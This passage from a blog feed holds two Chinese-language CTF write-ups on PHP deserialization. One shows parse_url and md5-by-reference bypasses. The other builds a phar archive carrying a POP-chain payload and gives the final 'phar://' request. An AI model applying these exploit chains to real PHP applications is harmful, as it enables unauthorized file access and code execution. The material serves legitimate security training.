class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">a</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em>hint.php</em></p><hr><p>这道题的重点不是其中的反序列化，而是其中<code>parse_url</code>与<code>md5</code>的绕过方法</p><hr><p>分析hint源码发现，我们需要将<code>Handle类</code>中的<code>handle属性</code>赋值为<code>Flag类</code>以调用<code>getFlag()</code>函数，<br>但单单这样构造序列化之后，传入的payload中肯定含有“flag”这一字符串，会因index.php源码中的遍历url而被匹配到，经过搜索发现，可以通过加两个双斜杠的方式绕过<code>parse_url</code>进而绕过正则匹配。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://wx2.sinaimg.cn/mw690/007b2muugy1g3rk245ri0j30hn00rmx9.jpg" alt="parse_url绕过" title>                </div>                <div class="image-caption">parse_url绕过</div>            </figure><hr><p>但<code>getFlag()</code>函数中还存在一个问题，虽然<code>Flag类</code>中前几条语句将<code>token属性</code>与<code>token_flag属性</code>相等，getFlag函数中，又将token_flag赋为了一个新的md5加密后的随机值，所以此处又需要绕过，爆破似乎可行，但经过搜索发现存在另一种较为简单的方法：<br>利用取地址符号“<code>&amp;</code>”，来使token与token_flag的关系始终相等，这样在给token_flag赋新值时，token也会跟着变化。</p><p><strong><em>POC:</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$b = new Flag(&quot;flag.php&quot;);</span><br><span class="line">$b-&gt;token = &amp;$b-&gt;token_flag;</span><br><span class="line">$a = new Handle($b);</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;WEB-1 justSoso&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="PHP反序列化" scheme="http://yoursite.com/categories/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
      <category term="md5绕过" scheme="http://yoursite.com/tags/md5%E7%BB%95%E8%BF%87/"/>
    
      <category term="parse_url绕过" scheme="http://yoursite.com/tags/parse-url%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>团队省赛选拔题</title>
    <link href="http://yoursite.com/2019/06/06/tags_test/"/>
    <id>http://yoursite.com/2019/06/06/tags_test/</id>
    <published>2019-06-06T06:31:27.841Z</published>
    <updated>2019-06-07T02:13:38.902Z</updated>
    
    <content type="html"><![CDATA[<p><strong>phar反序列化</strong></p><a id="more"></a><p><strong>引入</strong></p><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $welcome;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">simple_hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;welcome = <span class="string">"hello "</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">" welcome to ctf!"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;welcome;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;simple_hello();</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'test'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gogogo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $one;</span><br><span class="line">    <span class="keyword">public</span> $two;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;one-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nice</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $flag;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($flag, $file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        chdir(<span class="string">'upload'</span>);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;file.<span class="string">".jpg"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'file exist'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'file not exist'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">                </span>&#123;</span><br><span class="line">                      <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;flag.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br><span class="line">@$a = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">$e = <span class="keyword">new</span> nice($flag, $a);</span><br><span class="line">$e-&gt;check();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><p>刚刚拿到这道题的时候，发现存在多个PHP魔术方法，明显是反序列化；<br>但进一步审计发现并没有任何userialize的地方，经过搜索发现存在一种名为<code>phar反序列化</code>漏洞，即在不利用<code>unserialize()</code>函数的情况下，利用文件操作函数（<code>file_exits、is_dir等</code>）实现反序列化。</p><hr><br>首先分析一波phar文件的结构：phar本质上是一种压缩文件，其中`meta-data`部分需要被序列化之后存储，利用该漏洞的核心便是当文件操作函数结合`phar://伪协议`时会将phar文件中的`meta-data`部分反序列化，这时我们构造的序列化攻击链就会发挥作用其次，phar文件结构中还要添加被压缩的文件名（ex：test.jpg），之前由于一直未注意到这个问题导致题目卡了很长时间。。。。   <p><img src="http://wx2.sinaimg.cn/mw690/007b2muugy1g3rjk84c20j30j90650th.jpg" alt="phar文件结构"></p><hr><br>经过以上分析，我们可以写一个php文件（该文件中已将序列化构造链传到meta-data，本体攻击链构造较为简单，就不详述），访问该php文件会在目录下生成一个phar文件：<p><strong><em>POC</em></strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hello</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $welcome;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">simple_hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;welcome = <span class="string">"hello "</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">" welcome to ctf!"</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;welcome;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;simple_hello();</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'test'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gogogo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $one;</span><br><span class="line">    <span class="keyword">public</span> $two;</span><br><span class="line">     </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;one-&gt;get_flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'0'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nice</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $flag; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;flag.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$he = <span class="keyword">new</span> hello();</span><br><span class="line">$he -&gt;name = <span class="keyword">new</span> gogogo();</span><br><span class="line">$he -&gt;name -&gt; one = <span class="keyword">new</span> nice();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$phar -&gt; setMetadata($he);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><br>生成`phar.phar`文件之后，将其后缀名改为.jpg直接上传，上传后在存在各种类源码的ctf.php页面传入fiename参数。（ex：`ctf.php?filename=phar://upload/phar.jpg`）本来以为这道题就这样了，flag就会出来了，但怎么尝试上传flag就是不会回显，心态也有点崩。。。后经大佬提示，源码中47行check()函数：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        chdir(<span class="string">'upload'</span>);</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;file.<span class="string">".jpg"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'file exist'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'file not exist'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现首先会将目录切换到upload并且会在file属性后拼接一个“<code>.jpg</code>“，这样的话，就需要将原来添加的压缩文件名“<code>test.txt</code>”改为“<code>test.jpg</code>”以配合拼接<br>最终PAYLOAD：<code>ctf.php?filename=phar://phar.jpg/test</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;phar反序列化&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
      <category term="PHP反序列化" scheme="http://yoursite.com/categories/CTF/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
    
  </entry>
  
</feed>
